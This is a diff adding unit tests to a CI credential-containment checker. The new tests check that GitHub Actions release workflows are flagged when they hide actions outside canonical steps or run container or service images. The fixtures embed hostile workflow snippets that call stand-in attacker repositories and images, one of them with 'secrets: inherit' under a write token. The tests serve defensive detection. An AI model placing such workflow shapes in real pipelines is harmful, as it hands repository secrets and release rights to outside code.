@@ -40,6 +40,7 @@ from normalize_json import (  # noqa: E402
     normalize_preview_json,
 )
 from check_credential_containment import (  # noqa: E402
+    CHECKOUT_SOURCE,
     FROZEN_TRUST_ROOTS,
     RELEASE_ACTION_SOURCES,
     WASM_PACK_SOURCE,
@@ -1636,6 +1637,90 @@ jobs:
                 for item in self.check_fixture("engine-release.yml", ambiguous)
             )
         )
+
+    def test_release_job_cannot_hide_an_action_outside_a_canonical_step(self) -> None:
+        """Per-step correctness is not enough; the step list must be complete.
+
+        _step_blocks only recognises canonical six-space steps, so a job-level
+        `uses:` or a differently indented step list would be parsed as "no steps"
+        and pass a per-step allowlist unchallenged. Each of these shapes is a
+        working release job as far as GitHub is concerned.
+        """
+
+        reusable = """\
+name: engine-release
+on:
+  push:
+    tags: ["engine-v*"]
+
+permissions:
+  contents: write
+
+jobs:
+  build:
+    uses: attacker/evil-repo/.github/workflows/pwn.yml@main
+    secrets: inherit
+"""
+        self.assertTrue(
+            any(
+                "release job declares an action outside a canonical step" in item
+                for item in self.check_fixture("engine-release.yml", reusable)
+            ),
+            "a reusable workflow call escaped the release allowlist",
+        )
+
+        misindented = """\
+name: engine-release
+on:
+  push:
+    tags: ["engine-v*"]
+
+permissions:
+  contents: write
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+        - uses: attacker/evil-action@1111111111111111111111111111111111111111
+"""
+        self.assertTrue(
+            any(
+                "release job declares an action outside a canonical step" in item
+                for item in self.check_fixture("engine-release.yml", misindented)
+            ),
+            "a non-canonical step indentation escaped the release allowlist",
+        )
+
+    def test_release_job_cannot_run_a_container_image(self) -> None:
+        """A job image runs arbitrary code under the same write token as a step."""
+
+        for key, value in (("container", "attacker/evil-image:latest"), ("services", "")):
+            block = f"    {key}: {value}\n" if value else (
+                "    services:\n      db:\n        image: attacker/evil-image:latest\n"
+            )
+            workflow = f"""\
+name: engine-release
+on:
+  push:
+    tags: ["engine-v*"]
+
+permissions:
+  contents: write
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+{block}    steps:
+      - uses: {CHECKOUT_SOURCE}
+"""
+            self.assertTrue(
+                any(
+                    f"release job declares a {key}" in item
+                    for item in self.check_fixture("engine-release.yml", workflow)
+                ),
+                f"a hostile {key} escaped the release rules",
+            )
 
     def test_pinned_release_actions_resolve_to_their_commented_versions(self) -> None:
         """Every allow-listed release action must be pinned to a real 40-hex commit.
